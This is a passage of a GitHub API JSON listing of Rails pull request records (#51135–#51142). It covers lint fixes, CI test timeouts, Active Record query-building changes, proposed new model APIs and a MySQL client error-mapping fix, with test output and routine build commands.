            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-20T14:02:14Z",
        "updated_at": "2024-02-20T14:12:38Z",
        "closed_at": "2024-02-20T14:12:38Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51142",
            "html_url": "https://github.com/rails/rails/pull/51142",
            "diff_url": "https://github.com/rails/rails/pull/51142.diff",
            "patch_url": "https://github.com/rails/rails/pull/51142.patch",
            "merged_at": "2024-02-20T14:12:38Z"
        },
        "body": "Ref: https://github.com/rails/rails/pull/51139\r\n\r\nMakes it more clear that the expected behavior really is.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51142/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51142/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51141",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51141/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51141/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51141/events",
        "html_url": "https://github.com/rails/rails/pull/51141",
        "id": 2144418118,
        "node_id": "PR_kwDNIULOZ2W3oA",
        "number": 51141,
        "title": "Fix linting error for generated system test case.",
        "user": {
            "login": "peterberkenbosch",
            "id": 4252,
            "node_id": "MDQ6VXNlcjQyNTI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/4252?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/peterberkenbosch",
            "html_url": "https://github.com/peterberkenbosch",
            "followers_url": "https://api.github.com/users/peterberkenbosch/followers",
            "following_url": "https://api.github.com/users/peterberkenbosch/following{/other_user}",
            "gists_url": "https://api.github.com/users/peterberkenbosch/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/peterberkenbosch/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/peterberkenbosch/subscriptions",
            "organizations_url": "https://api.github.com/users/peterberkenbosch/orgs",
            "repos_url": "https://api.github.com/users/peterberkenbosch/repos",
            "events_url": "https://api.github.com/users/peterberkenbosch/events{/privacy}",
            "received_events_url": "https://api.github.com/users/peterberkenbosch/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-20T13:44:21Z",
        "updated_at": "2024-02-21T09:51:06Z",
        "closed_at": "2024-02-20T20:16:12Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51141",
            "html_url": "https://github.com/rails/rails/pull/51141",
            "diff_url": "https://github.com/rails/rails/pull/51141.diff",
            "patch_url": "https://github.com/rails/rails/pull/51141.patch",
            "merged_at": "2024-02-20T20:16:12Z"
        },
        "body": "Fixes:\r\n\r\n```\r\nOffenses:\r\n\r\ntest/application_system_test_case.rb:9:49: C: [Correctable] Style/TrailingCommaInHashLiteral: Avoid comma after the last item of a hash.\r\n      url: \"http://#{ENV[\"SELENIUM_HOST\"]}:4444\",\r\n```\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51141/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51141/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51140",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51140/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51140/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51140/events",
        "html_url": "https://github.com/rails/rails/pull/51140",
        "id": 2144398367,
        "node_id": "PR_kwDNIULOZ2Vxxw",
        "number": 51140,
        "title": "Address `ApplicationTests::DBConsoleTest` failures against asserion enabled Ruby",
        "user": {
            "login": "yahonda",
            "id": 73684,
            "node_id": "MDQ6VXNlcjczNjg0",
            "avatar_url": "https://avatars.githubusercontent.com/u/73684?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/yahonda",
            "html_url": "https://github.com/yahonda",
            "followers_url": "https://api.github.com/users/yahonda/followers",
            "following_url": "https://api.github.com/users/yahonda/following{/other_user}",
            "gists_url": "https://api.github.com/users/yahonda/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/yahonda/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/yahonda/subscriptions",
            "organizations_url": "https://api.github.com/users/yahonda/orgs",
            "repos_url": "https://api.github.com/users/yahonda/repos",
            "events_url": "https://api.github.com/users/yahonda/events{/privacy}",
            "received_events_url": "https://api.github.com/users/yahonda/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-20T13:34:49Z",
        "updated_at": "2024-02-20T13:52:36Z",
        "closed_at": "2024-02-20T13:52:36Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51140",
            "html_url": "https://github.com/rails/rails/pull/51140",
            "diff_url": "https://github.com/rails/rails/pull/51140.diff",
            "patch_url": "https://github.com/rails/rails/pull/51140.patch",
            "merged_at": "2024-02-20T13:52:36Z"
        },
        "body": "### Motivation / Background\r\nManaged to address CI failures https://buildkite.com/rails/rails-nightly/builds/191#018dc3d1-902c-4b01-a82c-b662ebdbe567/1182-1188 by increasing timeout value from 10 to 100 for assert_output method.\r\n\r\n### Detail\r\n- Ruby built with debug options that takes more than 20 seconds and gets failed Here, the Ruby is built with these options:\r\n\r\n```\r\ncppflags=\"-DENABLE_PATH_CHECK=0 -DRUBY_DEBUG=1\" optflags=\"-O3 -fno-inline\"\r\n```\r\n\r\n```ruby\r\n$ ruby -v\r\nruby 3.4.0dev (2024-02-20T11:52:09Z master c22cb960cf) [x86_64-linux]\r\n$ time bin/test test/application/dbconsole_test.rb\r\nRun options: --seed 5685\r\n\r\nF\r\n\r\nFailure:\r\nApplicationTests::DBConsoleTest#test_use_value_defined_in_environment_file_in_database_yml [test/console_helpers.rb:19]:\r\n\"sqlite>\" expected, but got:\r\n\r\n.\r\nExpected \"\" to include \"sqlite>\".\r\n\r\nbin/test test/application/dbconsole_test.rb:21\r\n\r\nF\r\n\r\nFailure:\r\nApplicationTests::DBConsoleTest#test_respect_environment_option [test/console_helpers.rb:19]:\r\n\"sqlite>\" expected, but got:\r\n\r\n.\r\nExpected \"\" to include \"sqlite>\".\r\n\r\nbin/test test/application/dbconsole_test.rb:43\r\n\r\nFinished in 10.105668s, 0.1979 runs/s, 0.3958 assertions/s.\r\n2 runs, 4 assertions, 2 failures, 0 errors, 0 skips\r\n\r\nreal    0m21.031s\r\nuser    0m8.665s\r\nsys     0m2.286s\r\n$\r\n```\r\n\r\n### Additional information\r\n- Ruby built without debug options that finishes less than 10 seconds.\r\n\r\n```ruby\r\n$ ruby -v\r\nruby 3.4.0dev (2024-02-20T11:52:09Z master c22cb960cf) [x86_64-linux]\r\n$ time bin/test test/application/dbconsole_test.rb\r\nRun options: --seed 1479\r\n\r\n..\r\n\r\nFinished in 5.463076s, 0.3661 runs/s, 1.0983 assertions/s.\r\n2 runs, 6 assertions, 0 failures, 0 errors, 0 skips\r\n\r\nreal    0m9.942s\r\nuser    0m2.288s\r\nsys     0m2.173s\r\n$\r\n```\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n\r\n\r\n\r\n\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51140/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51140/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51139",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51139/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51139/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51139/events",
        "html_url": "https://github.com/rails/rails/pull/51139",
        "id": 2144394951,
        "node_id": "PR_kwDNIULOZ2Vl_A",
        "number": 51139,
        "title": "Relation#where build BoundSqlLiteral rather than eagerly interpolate",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 5,
        "created_at": "2024-02-20T13:33:02Z",
        "updated_at": "2024-02-21T15:49:45Z",
        "closed_at": "2024-02-21T15:49:45Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51139",
            "html_url": "https://github.com/rails/rails/pull/51139",
            "diff_url": "https://github.com/rails/rails/pull/51139.diff",
            "patch_url": "https://github.com/rails/rails/pull/51139.patch",
            "merged_at": "2024-02-21T15:49:45Z"
        },
        "body": "Ref: https://github.com/rails/rails/pull/50793\r\n\r\nTo make not caching connection checkout viable, we need to reduced the amount of places where we need a connection.\r\n\r\nOnce big source of this is query/relation building, where in many cases it eagerly quote and interpolation bound values in SQL fragments.\r\n\r\nDoing this requires an active connection because both MySQL and Postgres may quote values differently based on the connection settings.\r\n\r\nInstead of eagerly doing all this, we can instead just insert these as bound values in the Arel AST. For adapters with prepared statements this is better anyway as it will avoid leaking statements, and for those that don't support it, it will simply delay the quoting to just before the query is executed.\r\n\r\nHowever, the `%` API (`where(\"title = %s\", something)`) can't realistically\r\nbe fixed this way, but I don't see much value in it and it probably should\r\nbe deprecated and removed.\r\n\r\nAlso CC @matthewd because I noticed https://github.com/rails/rails/pull/46600 so it look like you were headed in this same direction? Perhaps you have some insights to share.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51139/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51139/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51138",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51138/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51138/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51138/events",
        "html_url": "https://github.com/rails/rails/pull/51138",
        "id": 2144326539,
        "node_id": "PR_kwDNIULOZ2R1yQ",
        "number": 51138,
        "title": "Add syntax sugar as inverted exists? method",
        "user": {
            "login": "loqimean",
            "id": 49816584,
            "node_id": "MDQ6VXNlcjQ5ODE2NTg0",
            "avatar_url": "https://avatars.githubusercontent.com/u/49816584?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/loqimean",
            "html_url": "https://github.com/loqimean",
            "followers_url": "https://api.github.com/users/loqimean/followers",
            "following_url": "https://api.github.com/users/loqimean/following{/other_user}",
            "gists_url": "https://api.github.com/users/loqimean/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/loqimean/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/loqimean/subscriptions",
            "organizations_url": "https://api.github.com/users/loqimean/orgs",
            "repos_url": "https://api.github.com/users/loqimean/repos",
            "events_url": "https://api.github.com/users/loqimean/events{/privacy}",
            "received_events_url": "https://api.github.com/users/loqimean/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 7,
        "created_at": "2024-02-20T12:58:43Z",
        "updated_at": "2024-02-27T08:37:44Z",
        "closed_at": "2024-02-27T08:37:20Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51138",
            "html_url": "https://github.com/rails/rails/pull/51138",
            "diff_url": "https://github.com/rails/rails/pull/51138.diff",
            "patch_url": "https://github.com/rails/rails/pull/51138.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nThis Pull Request has been created because we have so many syntax sugar, like for `present?` method we have `blank?`, and so on, so, that's would be really nice to add opposite method for a `exists?` instead of writing always `!`, or using unless\r\n\r\n### Detail\r\n\r\nThis Pull Request changes adds just an inverted `exists?` method called `missing?`. So, it's really simple, but powerful change\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51138/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51138/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51137",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51137/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51137/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51137/events",
        "html_url": "https://github.com/rails/rails/pull/51137",
        "id": 2144217594,
        "node_id": "PR_kwDNIULOZ2L4xA",
        "number": 51137,
        "title": "Support IN queries on array columns",
        "user": {
            "login": "gregnavis",
            "id": 90490,
            "node_id": "MDQ6VXNlcjkwNDkw",
            "avatar_url": "https://avatars.githubusercontent.com/u/90490?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/gregnavis",
            "html_url": "https://github.com/gregnavis",
            "followers_url": "https://api.github.com/users/gregnavis/followers",
            "following_url": "https://api.github.com/users/gregnavis/following{/other_user}",
            "gists_url": "https://api.github.com/users/gregnavis/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/gregnavis/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/gregnavis/subscriptions",
            "organizations_url": "https://api.github.com/users/gregnavis/orgs",
            "repos_url": "https://api.github.com/users/gregnavis/repos",
            "events_url": "https://api.github.com/users/gregnavis/events{/privacy}",
            "received_events_url": "https://api.github.com/users/gregnavis/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-20T12:01:26Z",
        "updated_at": "2024-02-20T15:02:04Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51137",
            "html_url": "https://github.com/rails/rails/pull/51137",
            "diff_url": "https://github.com/rails/rails/pull/51137.diff",
            "patch_url": "https://github.com/rails/rails/pull/51137.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nA non-array column can be queried via `where(name: [value1, value2])` which is automatically converted to `name IN (value1, value2)` in SQL. An array column would treat that array as the value to search for, so it'd be natural to expect an array of arrays would result in an `IN` query. Unfortunately, that wasn't the case as `where(name: [[value1], [value2]])` would return `name = {{value1}, {value2}}` in SQL, instead of `name IN ({value1}, {value2})`.\r\n\r\n### Detail\r\n\r\nThat behavior stemmed from the fact that Active Record would force equality comparison for array columns if the value was an array. In order to allow `IN` queries this check was change to check whether it's a **one-dimensional** array by checking that the first item of is not an array.\r\n\r\nAfter these changes the following logic applies for querying array columns:\r\n\r\n1. Using a one-dimensional array results in an ordinary equality query.\r\n2. Using a two-dimensional array produces an `IN` query.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51137/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51137/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51136",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51136/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51136/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51136/events",
        "html_url": "https://github.com/rails/rails/pull/51136",
        "id": 2144159196,
        "node_id": "PR_kwDNIULOZ2IsqA",
        "number": 51136,
        "title": "Add `permitted_columns` to ActiveRecord, inverse of `ignored_columns`",
        "user": {
            "login": "scottwhudson",
            "id": 6406203,
            "node_id": "MDQ6VXNlcjY0MDYyMDM=",
            "avatar_url": "https://avatars.githubusercontent.com/u/6406203?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/scottwhudson",
            "html_url": "https://github.com/scottwhudson",
            "followers_url": "https://api.github.com/users/scottwhudson/followers",
            "following_url": "https://api.github.com/users/scottwhudson/following{/other_user}",
            "gists_url": "https://api.github.com/users/scottwhudson/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/scottwhudson/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/scottwhudson/subscriptions",
            "organizations_url": "https://api.github.com/users/scottwhudson/orgs",
            "repos_url": "https://api.github.com/users/scottwhudson/repos",
            "events_url": "https://api.github.com/users/scottwhudson/events{/privacy}",
            "received_events_url": "https://api.github.com/users/scottwhudson/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 7,
        "created_at": "2024-02-20T11:27:33Z",
        "updated_at": "2024-02-21T21:42:24Z",
        "closed_at": "2024-02-21T21:41:59Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51136",
            "html_url": "https://github.com/rails/rails/pull/51136",
            "diff_url": "https://github.com/rails/rails/pull/51136.diff",
            "patch_url": "https://github.com/rails/rails/pull/51136.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nCurrently, columns that are marked for removal from the database must first be added to the `ignored_columns` list, lest we suffer a failed deploy that requires manual intervention. This critical step can be overlooked because it's an additive change in a situation where code is typically being removed from a codebase, and trying to prevent this situation with linters and automated tests is tricky.\r\n\r\nIt would be great to be able to lean in the opposite direction by explicitly defining which columns the model has access to, similar to how we define strong params. When it's time to remove a column from the db, the column name is removed from `permitted_columns` and all of its references are removed from the model, eliminating the need to modify `ignored_columns`.\r\n\r\n### Detail\r\n\r\nThis Pull Request adds `permitted_columns` and `permitted_columns=` to `ActiveRecord::ModelSchema`, which acts as an inverse to `ignored_columns`. When set, only columns specified in `permitted_columns` will be referenced by the model.  If a column name is specified in both `permitted_columns` and `ignored_columns`, then it is ignored. \r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51136/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51136/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51135",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51135/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51135/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51135/events",
        "html_url": "https://github.com/rails/rails/pull/51135",
        "id": 2144122797,
        "node_id": "PR_kwDNIULOZ2GsHw",
        "number": 51135,
        "title": "Address `ApplicationTests::FrameworksTest` failure on Ubuntu 22.04",
        "user": {
            "login": "yahonda",
            "id": 73684,
            "node_id": "MDQ6VXNlcjczNjg0",
            "avatar_url": "https://avatars.githubusercontent.com/u/73684?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/yahonda",
            "html_url": "https://github.com/yahonda",
            "followers_url": "https://api.github.com/users/yahonda/followers",
            "following_url": "https://api.github.com/users/yahonda/following{/other_user}",
            "gists_url": "https://api.github.com/users/yahonda/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/yahonda/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/yahonda/subscriptions",
            "organizations_url": "https://api.github.com/users/yahonda/orgs",
            "repos_url": "https://api.github.com/users/yahonda/repos",
            "events_url": "https://api.github.com/users/yahonda/events{/privacy}",
            "received_events_url": "https://api.github.com/users/yahonda/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-20T11:07:40Z",
        "updated_at": "2024-02-20T11:40:11Z",
        "closed_at": "2024-02-20T11:40:11Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51135",
            "html_url": "https://github.com/rails/rails/pull/51135",
            "diff_url": "https://github.com/rails/rails/pull/51135.diff",
            "patch_url": "https://github.com/rails/rails/pull/51135.patch",
            "merged_at": "2024-02-20T11:40:11Z"
        },
        "body": "### Motivation / Background\r\n\r\nThis commit address Rails Nightly failure at https://buildkite.com/rails/rails-nightly/builds/191#018dc3d1-8fb2-4c35-ad1d-bd3891757361/1310-1318\r\n\r\n### Detail\r\n\r\nThis issue reproduces when the `default-mysql-client` apt package installs `mysql-client-8.0` that raises `CR_CONN_HOST_ERROR` which is mapped to `ActiveRecord::DatabaseConnectionError` while `mariadb-client` raises `CR_CONNECTION_ERROR` error which is mapped to `ActiveRecord::ConnectionNotEstablished`.\r\n\r\nIn this test, whichever exception `ActiveRecord::ConnectionNotEstablished` or `DatabaseConnectionError` is fine as long as the connection is invalid.\r\n\r\n- Steps to reproduce\r\n\r\nRun this step at Linux box on Ubuntu Jammy or whatever `default-mysql-client` installs MySQL client, not MariaDB one.\r\n\r\n```\r\ngit clone https://github.com/rails/rails\r\ncd rails/railties\r\nbundle install\r\nbin/test test/application/initializers/frameworks_test.rb:285\r\n```\r\n\r\n- Failure fixed by this commit\r\n\r\n```ruby\r\n$ bin/test test/application/initializers/frameworks_test.rb:285\r\nRun options: --seed 32832\r\n\r\nF\r\n\r\nFailure:\r\nApplicationTests::FrameworksTest#test_expire_schema_cache_dump_if_the_version_can't_be_checked_because_the_database_is_unhealthy [test/application/initializers/frameworks_test.rb:285]:\r\nExpected /Failed to validate the schema cache because of ActiveRecord::ConnectionNotEstablished/ to match \"Failed to validate the schema cache because of ActiveRecord::DatabaseConnectionError: There is an issue connecting with your hostname: 127.0.0.1.\\n\\nPlease check your database configuration and ensure there is a valid connection to your database.\\n\".\r\n\r\nbin/test test/application/initializers/frameworks_test.rb:263\r\n\r\nFinished in 6.299418s, 0.1587 runs/s, 0.6350 assertions/s.\r\n1 runs, 4 assertions, 1 failures, 0 errors, 0 skips\r\n```\r\n\r\n### Additional information\r\n- `default-mysql-client` package used by Rails CI\r\nhttps://github.com/rails/buildkite-config/blob/3158d00b48da5a30f4319af1f7ac73f2b7094898/Dockerfile#L91\r\n`default-mysql-client` installs different package per distribution, https://packages.ubuntu.com/jammy/default-mysql-client https://packages.debian.org/bookworm/default-mysql-client\r\n\r\n- Each error message are defined in these lines by these commits: \r\n- MariaDB\r\nhttps://github.com/MariaDB/server/blob/eeba940311ed17d160023280783fd2bbb64abef3/sql-common/errmsg.c#L32 https://github.com/MariaDB/server/commit/9075973dbf2ef69e95d427e3a979be23435692e3\r\n\r\n- MySQL\r\nhttps://github.com/mysql/mysql-server/blob/824e2b4064053f7daf17d7f3f84b7a3ed92e5fb4/libmysql/errmsg.cc#L39 https://github.com/mysql/mysql-server/commit/964d5fdb02659c8cd148b618f665957a1fbb3ce5\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51135/reactions",
